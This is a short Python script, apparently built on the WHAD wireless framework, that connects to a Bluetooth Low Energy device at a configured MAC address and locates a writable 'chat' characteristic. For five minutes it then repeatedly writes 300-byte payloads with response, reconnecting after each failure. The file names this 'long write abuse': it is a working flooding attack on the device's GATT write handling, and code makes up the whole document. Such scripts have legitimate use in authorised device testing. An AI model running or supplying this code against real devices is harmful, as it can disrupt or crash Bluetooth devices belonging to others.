# long_write_abuse.py

import os
import time
from whad_utils import connect_fast, resolve_write_handle, _safe_disconnect

TARGET_MAC = os.environ.get("TARGET_MAC", "02:80:e1:78:42:d0")
CHAT_SERVICE_UUID = os.environ.get("CHAT_SERVICE_UUID", "d973f2e0-b19e-11e2-9e96-0800200c9a66")
WRITE_CHAR_UUID = os.environ.get("WRITE_CHAR_UUID", "d973f2e2-b19e-11e2-9e96-0800200c9a66")
RUN_DURATION_S = float(os.environ.get("RUN_DURATION_S", "300"))
LONGWRITE_SLEEP_S = float(os.environ.get("LONGWRITE_SLEEP_S", "0.01"))
VERBOSE = True


def main():
    t_end = time.time() + RUN_DURATION_S
    total = 0
    c = dev = ch = None
    payload = bytes(range(256)) + bytes(range(44))
    while time.time() < t_end:
        try:
            if not dev:
                c, dev = connect_fast(TARGET_MAC, do_discover=False)
                h = resolve_write_handle(dev, CHAT_SERVICE_UUID, WRITE_CHAR_UUID)
                if not h:
                    raise RuntimeError("no writable handle (after discovery retries)")
                try:
                    ch = dev.find_characteristic_by_handle(h)
                except Exception:
                    ch = dev.find_characteristic_by_uuid(WRITE_CHAR_UUID)
            ch.write(payload, with_response=True)
            total += 1
            if LONGWRITE_SLEEP_S:
                time.sleep(LONGWRITE_SLEEP_S)
        except Exception as e:
            if VERBOSE:
                print(f"[warn] long_write transient: {e}")
            _safe_disconnect(c, dev)
            c = dev = ch = None
            continue
    print("long_writes=", total, "duration_s=", RUN_DURATION_S)


if __name__ == "__main__":
    main()
